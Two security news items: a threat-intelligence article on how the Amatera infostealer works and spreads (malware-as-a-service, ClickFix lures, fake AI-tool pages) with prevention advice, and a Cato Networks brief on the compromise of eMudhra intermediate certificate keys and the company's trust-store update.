Attacks, Breaches & Threat Intel.title: Amatera: How the prolific infostealer works and spreads
Attacks, Breaches & Threat Intel.context: ESET detections jumped by more than 500% in the first half of 2025 compared with the previous six months, making it the second most common attack vector after phishing
Attacks, Breaches & Threat Intel.full_text:
Infostealers have become an established business, with developers who produce and maintain the product and paying customers who run their own campaigns with them. Amatera – which topped ESET’s infostealer detections in Latin America in the first half of 2026 but targets victims worldwide – shows what this professionalization looks like in practice.

Like many other infostealers, Amatera goes after a range of data spanning login credentials, session cookies, tokens, crypto wallet information, messaging data, files, and secrets from development environments. The sheer breadth of the loot shows why infostealers are a mainstay of cybercrime – a single compromise can lead to account hijacking, financial fraud and crypto theft, as well as open the door into the organization where the victim works.

Here’s more about where Amatera came from, along with its business model, capabilities, and distribution.

What is Amatera?

Detected by ESET products as Win/PSW.Amatera, Amatera is a Windows infostealer written in C++ that was first observed in 2024. Since it’s marketed under the malware-as-a-service (MaaS) model, its developers maintain the code, the control panel, and the support infrastructure, while affiliates pay a subscription to use the malware in their campaigns.

Given the similarities in their respective code, Amatera is very likely a rebrand of ACR Stealer. Indeed, the latter has a predecessor of its own: a Sekoia investigation in May 2024 described it as an updated version of the GrMsk stealer, offered as a service on underground forums.

Rebranding – or releasing an updated version of a piece of malware under a new name – is very common across the MaaS ecosystem, particularly among ransomware operators. They sometimes sell the source code when they shut down their operations to avoid being tracked, or they update and rename it as a ‘business strategy’. In some cases, they leak it so that other malicious actors can reuse it. At any rate, by the end of 2024, Amatera Stealer was already on offer for $199 a month, with support via Telegram..

Amatera’s capabilities

Amatera extracts credentials stored in web browsers, along with cookies, browsing histories, form data, and session tokens. It can also search for and grab sensitive documents and files synced with OneDrive or SharePoint – Microsoft reported a surge in attacks on its enterprise customers between late April and mid-June 2026. Separately, Straiker found that the malware also went after cryptocurrency wallet data by manipulating the clipboard.

The malware is also under constant development, and it turns up as the final payload in a wide variety of attack chains. That variety is also typical of MaaS: the developers sell the product, and each affiliate chooses their own way to deliver it.

Amatera has spread via compromised websites, search engine ads, targeted emails, fake documents, SVG files, and ClickFix via fake CAPTCHAs. Indeed, several recent analyses of Amatera campaigns worldwide show that one of its key delivery vectors is ClickFix, a social engineering technique that was first documented in 2024 and was quickly picked up by adversaries to distribute a wide range of malware families.

Often, the victim sees a message that mimics a CAPTCHA check or a browser error and warns them of supposed technical problems that can be fixed by copying a command and running it on their computer. The victim’s own keystrokes then set the compromise in motion. The technique has moved beyond fake CAPTCHAs, however, as adversaries kept the social engineering core of ClickFix with some tweaks:

· AI-fix: Attackers build pages that impersonate legitimate AI services, including Anthropic’s Artifacts, OpenAI’s Canvas, and Microsoft Copilot Pages. The pages contain fake troubleshooting content for non-existent problems.

· CrashFix: A fake ad blocker triggers fake browser crashes and warns of data loss, pushing victims toward a malicious “quick fix.”

· ConsentFix: This variant tricks the victims into handing over their OAuth authorization tokens that open their Microsoft accounts to attackers without any password being stolen.

ClickFix-based campaigns have also used legitimate but compromised WordPress sites, among other methods. Attackers gained access to these sites through weak or stolen administrative credentials or by exploiting vulnerabilities in WordPress themes and plugins.

In Latin America, Amatera topped ESET’s infostealer detections in the first half of 2026, ahead of Formbook, Vidar, Lumma Stealer, SnakeStealer, and Rhadamanthys. ClickFix’s recent growth globally hasn’t been a straight line, however. ESET detections jumped by more than 500% in the first half of 2025 compared with the previous six months, making it the second most common attack vector after phishing. Detections fell steeply in the second half of 2025, before more than doubling in the first half of 2026 as attackers adapted the technique to new environments.

Amatera’s affiliates also buy Google ads. The Straiker research mentioned above uncovered dozens of fake install pages that were promoted through paid ads and SEO poisoning and impersonated AI and developer tools, such as Claude Code, NotebookLM, JetBrains, Comet, and Snowflake, and specifically targeted developers who use AI tools. Like AI-fix, these pages piggyback off the credibility of AI brands and share the execution chain with ClickFix.

Risks and consequences of an Amatera compromise

Based on its capabilities, these are some of the potential consequences of falling victim to Amatera:

Compromise of personal or corporate accounts through stolen passwords, cookies, and tokens

Unauthorized access to email and cloud storage

Theft of crypto assets when wallets or recovery phrases are exposed

Infrastructure compromise through SSH keys, FTP credentials, or development secrets

Installation of additional malware

Use of a compromised account for fraud, internal phishing campaigns, or further intrusions

The risk spills over to employers when the victim mixes personal and work profiles in the same web browser. A home computer may hold corporate email sessions, cloud consoles, code repositories, or HR systems. The stolen information eventually becomes a gateway that another actor can buy or exploit days later.

How to prevent and respond to an Amatera compromise

Here are a few tips for staying out of harm’s way, especially in corporate environments:

Remember that no legitimate CAPTCHA, error message, or installation guide will ask you to copy commands from a web page into the Run dialog, PowerShell, or Terminal. A search engine ad is no guarantee that a site is official. That applies equally to pages that look like they belong to a well-known AI service.

Enforce application control rules and reduce the attack surface by limiting the use of system interpreters and binaries outside their normal context.

Monitor PowerShell, Rundll32, WebDAV, unusual scheduled tasks, and the clearing of PowerShell history.

Use phishing-resistant authentication and keep browser sessions as short as business needs allow.

Separate personal and work profiles, and avoid storing secrets in the browser when a managed alternative is available.

Filter newly created sites, cloned installation pages, and downloads initiated from ads when the context doesn’t justify them.

If a compromise is confirmed, isolating the device is only the first step. From a trusted device, revoke active sessions, reset passwords, and rotate API keys, tokens, SSH credentials, and any other secrets present on the system. Also, review access to email, cloud services, repositories, and financial applications. The response must track follow-on activity, rather than stop at the initial host – documented campaigns executed additional payloads, created scheduled tasks, covered their tracks, and used legitimate system tools.

Conclusion

Amatera shows how the infostealer market works today. A developer maintains the product, and other actors distribute it via compromised websites, ads, fake AI tools, emails, or ClickFix instructions. The threat can outlive the malicious file itself, however, as passwords, cookies, session tokens, and confidential documents remain valuable even after the device has been cleaned. Stolen data can fuel both immediate fraud or later intrusions, and the rise in detections in 2026 shows attackers adopting and adapting malicious toolsets at a rapid clip.

Attacks, Breaches & Threat Intel.title: Cato CTRL Threat Brief: eMudhra Certificate Compromise Highlights the Value of Protection Delivered by an AI-Native SASE Platform
Attacks, Breaches & Threat Intel.context: The post Cato CTRL Threat Brief: eMudhra Certificate Compromise Highlights the Value of Protection Delivered by an AI-Native SASE Platform appeared first on Cato Networks
Attacks, Breaches & Threat Intel.full_text:
Executive summary

Eight eMudhra intermediate certificate authority (CA) private keys were compromised after being generated with insufficient randomness. Attackers could use these keys to forge certificates and impersonate legitimate websites or services to clients that still trust them. An attacker able to intercept a connection could potentially read or modify sensitive traffic.

We have deployed a certificate-trust update through our centrally managed PoP architecture, removing affected eMudhra certificates from the trust store used for TLS inspection. Delivering the update through the Cato Cloud removed the need for customers to patch security appliances at individual locations.

What happened?

Intermediate CAs sign certificates used to authenticate websites and services. Compromising their private keys can enable attackers to issue fraudulent certificates for domains they do not control. Organizations can therefore face exposure even when their legitimate certificates come from another provider.

Google and Mozilla received reports on October 17, 2026, and distributed emergency certificate blocks that day.

Mozilla also released updates associated with CVE-2026-113470. These include the certificate block list directly in Firefox and Thunderbird, protecting installations even when automatic block-list updates are disabled or unavailable.

Google found that no website certificates issued through the six affected TLS intermediates had appeared in Certificate Transparency (CT) logs before its emergency block took effect. CT logs are public records of certificates. Browsers that enforce CT, including Chrome, require valid proof that a certificate has been submitted to these logs before accepting it. Those browsers would therefore have rejected fraudulent certificates from the affected intermediates even before receiving the emergency blocks.

However, this protection does not extend to all software. Some applications, older browsers, or configurations without CT enforcement may have accepted unlogged fraudulent certificates if they still trusted the affected intermediates. The absence of certificates from those intermediates in CT logs before Google’s block therefore does not prove that no attacks occurred.

eMudhra says its root private keys and other intermediate CAs are unaffected. Its investigation remains ongoing.

Business risks

The exposure extends beyond employee browsers. Applications, API integrations, containers, and embedded devices may use independent trust stores or lack effective certificate-revocation checks.

Potential business consequences include:

Credential theft and data exposure: Intercepted connections could expose passwords, session tokens, and confidential information.

Transaction manipulation: Attackers impersonating trusted services could alter business communications or API responses.

Service disruption: Emergency trust removal can also reject legitimate certificates. Google announced a broader root-removal rollout expected on October 27, requiring affected website operators to replace their certificates.

Operational costs: Identifying and updating separate trust stores across applications and infrastructure creates work and opportunities for missed remediation.

These are potential impacts, not evidence of observed exploitation.

Our response: centralized control, global enforcement

The Cato AI-native SASE Platform converges networking and security in a cloud-native service delivered through globally distributed points of presence (PoPs). Our Single Pass Cloud Engine provides integrated security enforcement, while centralized management allows us to deliver updates across our cloud infrastructure. This reduces the coordination and maintenance work customers would otherwise undertake across distributed security appliances.

Centralized operations also support controlled deployment. Our established PoP change-management practices include phased rollouts, validation, monitoring, and rollback capabilities to manage operational risk as the platform evolves.

What this means for our customers

We have centrally deployed a certificate-trust update across our globally distributed PoPs, removing affected eMudhra certificates from the trust store used for TLS inspection. Customers do not need to make configuration changes to receive this update.

Analysis of our data lake showed that the certificate chains affected by this update appeared in only a very small proportion of the network flows examined. Based on this limited usage, we expect minimal connectivity impact for customers.

For details about the update and potential connectivity impact, see the security update.

For locations or connections that access the internet outside our platform, organizations should apply the relevant vendor updates or extend our platform’s coverage so those connections are subject to our certificate-validation controls.
